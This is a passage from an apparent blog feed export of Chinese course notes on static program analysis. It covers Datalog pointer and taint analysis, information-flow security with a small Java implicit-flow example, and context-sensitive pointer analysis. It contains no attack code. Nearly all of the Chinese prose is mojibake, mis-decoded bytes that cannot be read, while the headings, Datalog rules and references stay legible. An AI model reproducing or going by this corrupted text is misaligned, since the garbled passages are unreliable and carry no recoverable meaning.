thisï¼Œå»ºç«‹ä¸€ä¸ªcall graphè¾¹<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211906002.png" alt="image-20200906211906002" style="width:90%;"></p></li><li><p>ä¼ å‚æ•°ï¼Œargumentå’Œparameterè¡¨ç¤ºå®å‚å’Œå½¢å‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212005590.png" alt="image-20200906212005590" style="width:90%"></p></li><li><p>ä¼ è¿”å›å€¼<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212036419.png" alt="image-20200906212036419" style="width:90%;"></p></li></ol><p>åšå…¨ç¨‹åºæŒ‡é’ˆåˆ†ææ—¶éœ€è¦å¼•å…¥ä¸€ä¸ªå…¥å£EDBï¼Œä»¥ä¸‹ä¸ºå®Œæ•´ä»£ç <br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906212109286.png" alt="image-20200906212109286" style="width:90%;"></p><p>æ³¨æ„ï¼Œå¦‚æœmä¸å¯è¾¾ï¼Œé‚£ä¹ˆå®ƒä»¬çš„<code>VarPointsTo</code>æ°¸è¿œä¸ºç©ºï¼Œå› æ­¤å…¶ä»–æ¨å¯¼ä¸éœ€è¦åŠ <code>Reachable(m)</code>ã€‚</p><h1 id="Taint-Analysis-via-Datalog"><a href="#Taint-Analysis-via-Datalog" class="headerlink" title="Taint Analysis via Datalog"></a>Taint Analysis via Datalog</h1><p>åœ¨Datalogä¸Šåšæ±¡ç‚¹åˆ†ææ—¶ï¼Œéœ€è¦é¢å¤–å®šä¹‰ä»¥ä¸‹EDBå’ŒIDB</p><ul><li><p>EDB</p><ul><li><code>Source(m: M)</code>ï¼Œå®šä¹‰å‡½æ•° m ä¸ºsource</li><li><code>Sink(m: M)</code>ï¼Œå®šä¹‰å‡½æ•° m ä¸ºsink</li><li><code>Taint(l: S, t: T)</code>ï¼Œ taint(l,t) è¡¨ç¤ºåœ¨lè¡Œäº§ç”Ÿäº†æ±¡ç‚¹tï¼Œç”¨äºå…³è”callsiteäº§ç”Ÿçš„æ±¡ç‚¹æ•°æ®</li></ul></li><li><p>IDB</p><ul><li><code>TaintFlow(t: T, m: M)</code>ï¼Œè¡¨ç¤ºæ±¡ç‚¹<code>T</code>æµå‘<code>M</code>æ–¹æ³•</li></ul></li></ul><p>åœ¨Callè¯­å¥ä¸Šæ–°å¢å¦‚ä¸‹æ¨å¯¼ï¼š</p><ul><li><p>å¤„ç†sourceï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200907211233439.png" alt="image-20200907211233439"></p><p>å°†è¿”å›å€¼æ ‡è®°ä¸ºæ±¡ç‚¹ã€‚</p></li><li><p>å¤„ç†sinkï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200907211324230.png" alt="image-20200907211324230"></p><p>nè¡¨ç¤ºä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œ<code>Taint(_,t)</code>ç”¨äºä¿è¯å‚æ•°ä¼ å…¥äº†ä¸€ä¸ªæ±¡ç‚¹æ•°æ®ã€‚</p></li></ul><h1 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h1><p>è®¾Vä¸ºèŠ‚ç‚¹ï¼ŒDè¡¨ç¤ºé›†åˆä¸­å…ƒç´ </p><ul><li>data(V,D) &lt;- gen(V,D)</li><li>data(V,D) &lt;- edge(Vâ€™, V), date(Vâ€™, D),  !kill(V, D) # æ³¨æ„ä¸€å®šè¦é˜²æ­¢çŸ›ç›¾</li><li>data(entry,d)</li></ul><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Datalogä½œä¸ºæ–°å…´çš„ç¨‹åºåˆ†ææ¨¡å‹ï¼Œæœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š</p><ol><li>åˆ†æå®ç°ç®€å•ï¼›</li><li>å¯è¯»æ€§å¼ºï¼›</li><li>åˆ†ææ•ˆç‡å¯ä»¥ä»é«˜åº¦ä¼˜åŒ–Datalogå¼•æ“è·ç›Šã€‚</li></ol><p>ç„¶è€Œå®ƒçš„ä¼˜ç‚¹ä¹Ÿæ­£æ˜¯å®ƒçš„ç¼ºç‚¹ï¼š</p><ol><li>é™åˆ¶è¡¨è¾¾ï¼Œæ²¡æ³•è¡¨è¾¾ç‰¹æ®Šæƒ…å†µï¼Œå¦‚å…ˆå‰çš„gen-killï¼Œdatalogåªèƒ½é€’å¢ï¼Œåˆä¾‹å¦‚datalogå¾ˆéš¾è¡¨è¾¾æ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³çš„æƒ…å†µï¼ˆåªèƒ½ä¸€ä¸ªä¸€ä¸ªåŠ ï¼‰ï¼›</li><li>æ•ˆç‡ä¸¥é‡ä¾èµ–å¼•æ“ï¼Œæ— æ³•å®Œå…¨æ§åˆ¶å¼•æ“æ€§èƒ½ã€‚</li></ol><p>ä¸ªäººæ„Ÿè§‰Datalogå¾ˆåƒç›®å‰æµè¡Œçš„LGTMæ€è·¯ï¼Œä½†æ˜¯ç¡®å®æ„Ÿè§‰è¡¨è¾¾ä¸æ˜¯å¾ˆè‡ªç”±ï¼Œç„¶è€Œå®ƒè¢«å¾ˆå¤šå¤§ä½¬è®¤ä¸ºæ˜¯æœªæ¥ä¸»æµçš„ç¨‹åºåˆ†ææ¡†æ¶ï¼Œè¿˜æ˜¯å€¼å¾—å­¦ä¹ çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>David Maier, K. Tuncay Tekle, Michael Kifer, and David S. Warren, â€œDatalog: Concepts, History, and Outlookâ€. Chapter, 2018.</li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ±¡ç‚¹åˆ†æ </tag>
            
            <tag> æŒ‡é’ˆåˆ†æ </tag>
            
            <tag> Datalog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E5%AE%89%E5%85%A8%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E5%AE%89%E5%85%A8%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>åœ¨è½¯ä»¶å®‰å…¨ä¸­ï¼Œæœ€å¸¸è§çš„æ¼æ´æœ‰æ³¨å…¥ç±»æ¼æ´ï¼ˆInjectionï¼‰å’Œä¿¡æ¯æ³„éœ²ï¼ˆInformation Leakï¼‰ï¼Œè€Œæœ¬èŠ‚è¯¾å°†ä»‹ç»çš„Information Flow åˆ†ææ–¹æ³•å¯ä»¥æœ‰æ•ˆå¤„ç†ä»¥ä¸Šæ¼æ´ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ±¡ç‚¹åˆ†ææŠ€æœ¯ã€‚</p><h1 id="Information-Flow-Security"><a href="#Information-Flow-Security" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h1><a id="more"></a><h2 id="Information-Flow"><a href="#Information-Flow" class="headerlink" title="Information Flow"></a>Information Flow</h2><blockquote><p>Information flow: if the information in variable x is transferred to variable y, then there is information flow x â†’ y. </p></blockquote><p>ä¿¡æ¯æµ[1] æŒ‡ç¨‹åºä¸­çš„å˜é‡ä¿¡æ¯çš„æµåŠ¨ï¼Œå¦‚æœ‰è¯­å¥<code>y = x</code>ï¼Œé‚£ä¹ˆå­˜åœ¨ä¿¡æ¯æµ $x\rightarrow y$ï¼Œå¯ä»¥çœ‹å‡ºï¼Œä¿¡æ¯æµåˆ†æå¾ˆåƒå…ˆå‰çš„æŒ‡é’ˆåˆ†æã€‚</p><h2 id="Access-Control-v-s-Infomation-Flow-Security"><a href="#Access-Control-v-s-Infomation-Flow-Security" class="headerlink" title="Access Control v.s. Infomation Flow Security"></a>Access Control v.s. Infomation Flow Security</h2><ul><li><p>è®¿é—®æ§åˆ¶ç”¨äºæ£€æŸ¥ä¿¡æ¯è®¿é—®çš„æƒé™ï¼Œä½†æ˜¯æ— æ³•æ£€æŸ¥æœ‰æƒé™çš„ç”¨æˆ·åšä»€ä¹ˆ</p></li><li><p>ä¿¡æ¯æµå®‰å…¨ç”¨äºæ£€æŸ¥ç¨‹åºå¤„ç†æ•°æ®çš„å®‰å…¨æ€§ï¼Œæ˜¯ç«¯åˆ°ç«¯çš„ä¿¡æ¯å®‰å…¨</p></li></ul><p>å®é™…ç³»ç»Ÿä¸­é€šå¸¸éœ€è¦è®¿é—®æ§åˆ¶å’Œä¿¡æ¯æµæ§åˆ¶ä¸¤è€…é…åˆä½¿ç”¨ã€‚</p><h2 id="Information-Flow-Security-1"><a href="#Information-Flow-Security-1" class="headerlink" title="Information Flow Security"></a>Information Flow Security</h2><p>ä¿¡æ¯æµå®‰å…¨ä¸»è¦æœ‰ä¸¤æ­¥éª¤ï¼š</p><ol><li>å°†å˜é‡åˆ’åˆ†ä¸ºä¸åŒå®‰å…¨ç­‰çº§ï¼ˆSecurity Levelsï¼‰</li><li>å¯¹ä¸åŒç­‰çº§çš„ä¿¡æ¯æµåšä¸åŒç­–ç•¥ï¼ˆInformation Flowï¼‰</li></ol><h3 id="Security-Levels"><a href="#Security-Levels" class="headerlink" title="Security Levels"></a>Security Levels</h3><p>é€šå¸¸å¯¹ä¿¡æ¯æµåˆ†ä¸ºä¸¤çº§â€”â€”é«˜çº§ï¼ˆHï¼‰å’Œä½çº§ï¼ˆLï¼‰ï¼Œè¡¨ç¤ºç§˜å¯†å’Œå…¬å¼€ä¿¡æ¯ã€‚</p><p>Dorothy ç­‰äºº[2] æ›¾æå‡ºç”¨æ ¼è¡¨ç¤ºä¿¡æ¯æµï¼Œå³ $L\leq H$</p><p>å®é™…ä¸­ä¹Ÿå¯ä»¥æœ‰æ›´å¤šçº§ã€‚</p><h3 id="Infomation-Flow-Policy"><a href="#Infomation-Flow-Policy" class="headerlink" title="Infomation Flow Policy"></a>Infomation Flow Policy</h3><p>é«˜å¯†çº§ä¿¡æ¯ä¸èƒ½å½±å“ä½å¯†çº§ä¿¡æ¯ï¼Œå³é«˜å¯†çº§ä¸èƒ½æµå‘ä½å¯†çº§ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905193021433.png" alt="image-20200905193021433"></p><h1 id="Confidentiality-and-Integrity"><a href="#Confidentiality-and-Integrity" class="headerlink" title="Confidentiality and Integrity"></a>Confidentiality and Integrity</h1><p>ä¿å¯†æ€§ï¼ˆConfidentialityï¼‰ï¼šé˜»æ­¢ç§˜å¯†ä¿¡æ¯è¢«æ³„éœ²ï¼Œå¯ä»¥çœ‹å‡ºå…ˆå‰çš„ç­–ç•¥å°±æ˜¯ä¿è¯äº†ä¿å¯†æ€§ï¼Œä¿¡æ¯æ³„éœ²ç±»æ¼æ´å°±æ˜¯è¿åäº†ä¿å¯†æ€§ï¼›</p><p>å®Œæ•´æ€§ï¼ˆIntegrityï¼‰ï¼šä¿è¯é‡è¦ä¿¡æ¯ä¸è¢«ä¸å¯ä¿¡ä¿¡æ¯æ±¡æŸ“ï¼Œæ³¨å…¥ç±»æ¼æ´å°±æ˜¯è¿åäº†å®Œæ•´æ€§ã€‚</p><p>ä¸‹å›¾å¯ä»¥çœ‹å‡ºConfidentialityå’ŒIntegrityæ˜¯å¯¹ç§°çš„ï¼Œå¯ä»¥è§†ä¸ºä¿¡æ¯çš„è¯»å®‰å…¨å’Œå†™å®‰å…¨ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905194503470.png" alt="image-20200905194503470"></p><p>è¿™ä¹Ÿæ„å‘³ç€ï¼Œå¯ä»¥ç”¨ç›¸åŒçš„æŠ€æœ¯è§£å†³ä»¥ä¸Šä¸¤ç±»æ¼æ´ã€‚</p><h1 id="Explicit-Flow-and-Convert-Channels"><a href="#Explicit-Flow-and-Convert-Channels" class="headerlink" title="Explicit Flow and Convert Channels"></a>Explicit Flow and Convert Channels</h1><p>æ˜¾ç¤ºæµï¼ˆExplicit Flowï¼‰æŒ‡ç›´æ¥é€šè¿‡èµ‹å€¼ä¼ é€’ä¿¡æ¯çš„æµï¼Œå¦‚ï¼š</p><ul><li><code>x = y</code></li><li><code>x = y + z</code></li></ul><p>éšç§˜ä¿¡é“ï¼ˆConvert Channelsï¼‰[4]æŒ‡é€šè¿‡æ§åˆ¶æµå½±å“ä¿å¯†æ•°æ®çš„ä¿¡æ¯æµï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret = getSecret();</span><br><span class="line"><span class="keyword">if</span> (secret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    publik = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    publik = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œæ ¹æ® <code>publik</code> æ•°æ®å¯ä»¥æ¨æµ‹ <code>secret</code> æ­£è´Ÿã€‚</p><p>é€šå¸¸æ¥è¯´ï¼Œéšç§˜ä¿¡é“æœ‰ä»¥ä¸‹è¡¨ç°å½¢å¼</p><ul><li><p>éšå¼æµï¼ˆImplicit flowsï¼‰<br><code>if (secret &lt; 0 ) p = 1; else p = 0;</code></p></li><li><p>ç»ˆæ­¢ä¿¡é“ï¼ˆTermination channelsï¼‰<br><code>while ( secret &lt; 0 ) {...};</code></p></li><li><p>æ—¶é—´ä¿¡é“ï¼ˆTiming channelsï¼‰<br><code>if ( secret &lt; 0 ) for(...) {...};</code></p></li><li><p>å¼‚å¸¸ï¼ˆExceptionsï¼‰<br><code>if ( secret &lt; 0 ) throw new Exception(&quot;...&quot;);</code></p></li></ul><p>ç„¶è€Œï¼Œéšè—ä¿¡é“æ³„éœ²æ•°æ®é‡è¾ƒå°ï¼Œä¸€èˆ¬åˆ†æè‡³é’ˆå¯¹æ˜¾ç¤ºæµã€‚</p><h1 id="Taint-Analysis"><a href="#Taint-Analysis" class="headerlink" title="Taint Analysis"></a>Taint Analysis</h1><p>æ±¡ç‚¹åˆ†æå°†æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼Œè¢«æ±¡æŸ“æ•°æ®å’Œæœªè¢«æ±¡æŸ“æ•°æ®ã€‚</p><ul><li>Sourceï¼šæ±¡ç‚¹ä¼ æ’­æºï¼Œæ±¡ç‚¹æ•°æ®å¸¸å¸¸æ˜¯ä¸€äº›å‡½æ•°çš„è¿”å›å€¼ï¼›</li><li>Sinkï¼šæ±¡ç‚¹ä¼ æ’­è‡³å…³é”®ç‚¹ï¼Œä¹Ÿå«sinkç‚¹ï¼Œå¸¸å¸¸æ˜¯æ•æ„Ÿå‡½æ•°çš„å‚æ•°ã€‚</li></ul><p>å¯¹äº Confidentialityï¼Œå¯ä»¥å…¶åšå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>Sourceï¼šä¿å¯†æ•°æ®</li><li>Sinkï¼šæ³„éœ²ç‚¹</li></ul><p>å¯¹äº Integrityï¼Œå¯å¯¹å…¶åšå¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li>Sourceï¼šä¸å¯ä¿¡æ•°æ®</li><li>Sinkï¼šæ•æ„Ÿå‡½æ•°</li></ul><h2 id="Taint-and-Pointer-Analysis"><a href="#Taint-and-Pointer-Analysis" class="headerlink" title="Taint and Pointer Analysis"></a>Taint and Pointer Analysis</h2><p>æ±¡ç‚¹åˆ†æä¸æŒ‡é’ˆåˆ†æéå¸¸ç±»ä¼¼ï¼Œå°†æ±¡ç‚¹åˆ†æåšå¦‚ä¸‹è°ƒæ•´ï¼Œå°±å¯ä»¥å€ŸåŠ©æŒ‡é’ˆåˆ†æåšæ±¡ç‚¹åˆ†æï¼š</p><ul><li>å°†æ±¡ç‚¹æ•°æ®ä½œä¸ºç‰¹æ®Šobjects</li><li>åœ¨allocation sitesä¸­äº§ç”Ÿsource</li><li>å€ŸåŠ©æŒ‡é’ˆåˆ†æå®Œæˆæ±¡ç‚¹åˆ†æ</li></ul><p>ä»¥ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸ºä¾‹ï¼š</p><p>é¦–å…ˆå®šä¹‰æ•°æ®æŠ½è±¡ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905202944738.png" alt="image-20200905202944738"></p><p>åœ¨æ•°æ®æŠ½è±¡ä¸­åŠ å…¥æ±¡ç‚¹æ•°æ®ï¼ˆTaint Dataï¼‰ï¼Œ$T\subset O$</p><p>åˆ†æçš„è¾“å…¥ä¸ºå®šä¹‰çš„ source å’Œ sinkï¼Œè¾“å‡ºä¸º TaintFlowsï¼Œè®°ä¸º$<t_i, m> \in TaintFlows$ï¼Œ è¡¨ç¤ºæ±¡ç‚¹ $t_i$ ä¼ å…¥äº†æ•æ„Ÿå‡½æ•° $m$ ä¸­ã€‚</t_i,></p><p>åœ¨ call statments ä¸­æ ¹æ®sourceäº§ç”Ÿæ±¡ç‚¹ $t_l$ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905204725605.png" alt="image-20200905204725605"></p><p>å‰©ä¸‹çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™ä¸æŒ‡é’ˆåˆ†æä¸€è‡´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905204756009.png" alt="image-20200905204756009"></p><p>åœ¨call statementsä¸­æ£€æŸ¥æ±¡ç‚¹æ˜¯å¦ä¼ æ’­åˆ°sinkï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905205129601.png" alt="image-20200905205129601"></p><p>ä¸‹å›¾ä¸¾ä¾‹è¯´æ˜äº†ä¸€ä¸ªåœ¨æŒ‡é’ˆåˆ†æçš„åŒæ—¶åšæ±¡ç‚¹åˆ†æçš„è¿‡ç¨‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905205353856.png" alt="image-20200905205353856"></p><p>æ³¨æ„ï¼Œè¿™é‡Œåªä»‹ç»äº†æœ€ç®€å•çš„æ±¡ç‚¹åˆ†æï¼ŒçœŸå®æƒ…å†µæ¯”æ ·ä¾‹å¤æ‚å¾ˆå¤šï¼Œå½“éœ€è¦å¤„ç†å…¶ä»–è¯­å¥å’Œæ–¹æ³•ï¼Œæ¯”å¦‚ Java ä¸­å­—ç¬¦ä¸²æ‹¼æ¥æ–¹æ³•<code>append()</code>ï¼Œä½†æ˜¯åŸºæœ¬æ€è·¯æ˜¯ä¸å˜çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Dorothy E. Denning and Peter J. Denning, â€œCertification of Programs for Secure Information Flowâ€. CACM 1977.</li><li>Dorothy E. Denning, â€œA Lattice Model of Secure Information Flowâ€. CACM 1976.</li><li>Ken Biba, â€œIntegrity Considerations for Secure Computer Systemsâ€. Technical Report, ESD-TR-76-372, USAF Electronic Systems Division, Bed-ford, MA, 1977.</li><li>Butler W. Lampson, â€œA Note on the Confinement Problemâ€. CACM 1973</li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ±¡ç‚¹åˆ†æ </tag>
            
            <tag> Information flow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%8F%E6%84%9F%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%8F%E6%84%9F%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Problem-of-Context-Insensitive-C-I"><a href="#Problem-of-Context-Insensitive-C-I" class="headerlink" title="Problem of Context-Insensitive (C.I.)"></a>Problem of Context-Insensitive (C.I.)</h2><ul><li>æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨çš„ä¸Šä¸‹æ–‡ä¸ä¸€æ ·ï¼›</li><li>åœ¨ä¸åŒçš„è°ƒç”¨ä¸Šä¸‹æ–‡é‡Œï¼Œå‡½æ•°å†…çš„å˜é‡ä¼šæŒ‡å‘ä¸åŒï¼›</li><li>åœ¨ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸­ï¼Œå‡½æ•°å†…çš„å¯¹è±¡æŒ‡å‘çš„å†…å®¹æ˜¯ä¸åŒä¸Šä¸‹æ–‡æ··åˆèµ·æ¥çš„ï¼ˆå¦‚ä¸Šä¾‹ä¸­ $n$ æŒ‡å‘ $o_1$ å’Œ $o_2$ï¼‰ï¼Œè€Œè¿™äº›å†…å®¹ä¼šåå‘ä¼ æ’­ï¼Œé€ æˆæ›´å¤šä¸å‡†ç¡®çš„ç»“æœã€‚</li></ul><a id="more"></a><p>å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200829210207900.png" alt="image-20200829210207900"></p><p>å½“åˆ†æåˆ°<code>int i = x.get()</code> æ—¶ï¼Œä¸Šä¸‹æ–‡ä¸æ•æ„ŸæŒ‡é’ˆåˆ†æä¼šè®¤ä¸º $x$ æŒ‡å‘ $o_1,o_2$ï¼Œå› æ­¤åšå¸¸é‡åˆ†ææ—¶ï¼Œ$i$ çš„åˆ†æç»“æœå°±æ˜¯ NACï¼Œè¿™å½“ç„¶æ˜¯ä¸å‡†ç¡®çš„â€”â€”å…¶å…³é”®ç‚¹åœ¨äºnæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ä¸åŒå‡½æ•°è°ƒç”¨æ—¶ï¼Œnä¼šè®°å½•ä¸‹æ‰€æœ‰è°ƒç”¨ç»“æœçš„é›†åˆã€‚</p><h2 id="Context-Sensitivity-C-S"><a href="#Context-Sensitivity-C-S" class="headerlink" title="Context Sensitivity(C.S.)"></a>Context Sensitivity(C.S.)</h2><blockquote><p>Context sensitivity models calling contexts by distinguishing different data flows of different contexts to improve precision.</p></blockquote><p>ä¸Šä¸‹æ–‡æ•æ„Ÿæ¨¡å‹ä¼šåœ¨è°ƒç”¨æ—¶ä¼šåŒºåˆ†ä¸åŒä¸Šä¸‹æ–‡ï¼Œä»¥æå‡å‡†ç¡®ç‡ã€‚</p><p>ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æéœ€è¦å¯¹ä¸Šä¸‹æ–‡æŠ½è±¡å»ºæ¨¡ï¼Œç›®å‰æœ€ç»å…¸çš„ç­–ç•¥æ˜¯ <strong>call-site sensitivity</strong>ï¼Œå³ä¸Šä¸‹æ–‡ä¸ºè°ƒç”¨ç‚¹å‡½æ•°ï¼ˆè°ƒç”¨ç‚¹+è¢«è°ƒå‡½æ•°ï¼‰åºåˆ—ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200829221253965.png" alt="image-20200829221253965"></p><p>ä¾‹å¦‚å¦‚ä¸Šä»£ç ï¼Œ<code>id()</code>å‡½æ•°å­˜åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ <strong>[1]</strong> å’Œ <strong>[2]</strong>ã€‚</p><h2 id="Cloning-Based-Context-Sensitivity"><a href="#Cloning-Based-Context-Sensitivity" class="headerlink" title="Cloning-Based Context Sensitivity"></a>Cloning-Based Context Sensitivity</h2><p>ä¸ºå®ç°ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯ <strong>cloning-based</strong>ï¼Œå³å¯¹äºæ¯ä¸€ä¸ªå‡½æ•°ï¼Œæ¯åˆ°æ–°çš„ä¸Šä¸‹æ–‡å°±å…‹éš†ä¸€ä»½æ–°å‡½æ•°å’Œå…¶å˜é‡ï¼š</p><blockquote><p>In cloning-based context-sensitive pointer analysis, each method is qualified by one or more contexts.</p></blockquote><p>æ³¨æ„ï¼Œå¯¹æ¯ä¸ªå‡½æ•°çš„å…‹éš†æœ¬è´¨æ˜¯å¯¹å‡½æ•°å†…å˜é‡çš„å…‹éš†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830103742490.png" alt="image-20200830103742490"></p><p>å¯¹äº<code>id()</code>å‡½æ•°å†…å˜é‡ <code>n</code> æ¥è¯´ï¼Œåœ¨ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œè°ƒç”¨æ—¶ï¼Œåˆ†åˆ«å…‹éš†å‡º<code>[1]:n</code>å’Œ<code>[2]:n</code>ä¸ªå˜é‡</p><p><strong>è¡¥å……1ï¼š</strong>å¦ä¸€ç§å®ç°æ–¹æ³•æ˜¯ä½¿ç”¨å†…è”ï¼Œå³æŠŠè¢«è°ƒå‡½æ•°çš„ä»£ç åµŒå…¥åˆ°è°ƒç”¨å‡½æ•°ä¸­ï¼Œå¯¹å‚æ•°è¿›è¡Œæ”¹åæ›¿æ¢ï¼Œå®é™…æ•ˆæœä¸è¿™é‡Œçš„å…‹éš†ç­‰æ•ˆã€‚</p><p><strong>è¡¥å……2ï¼š</strong>å…‹éš†æ€æƒ³ä¸åªæ˜¯å¯ä»¥åšè¿‡ç¨‹é—´åˆ†æï¼Œè¿˜å¯ä»¥åšè¿‡ç¨‹å†…åˆ†æï¼Œæ¯”å¦‚å¯¹äºå¾ªç¯ï¼Œå¯ä»¥å±•å¼€ä¸€å®šå±‚æ•°kåšåˆ†æã€‚</p><h2 id="Context-Sensitive-Heap"><a href="#Context-Sensitive-Heap" class="headerlink" title="Context-Sensitive Heap"></a>Context-Sensitive Heap</h2><p>å¯¹äºOOè¯­è¨€ï¼Œä¸ä»…å˜é‡æœ‰ä¸Šä¸‹æ–‡ï¼Œå¯¹è±¡å®ä¾‹ä¹Ÿéœ€è¦æœ‰ä¸Šä¸‹æ–‡ï¼Œå³éœ€è¦åšå †æŠ½è±¡ï¼ˆå¯¹è±¡å­˜å‚¨åœ¨å †åŒºï¼‰ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œå¯¹<code>n</code>åšä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æï¼š<br><img 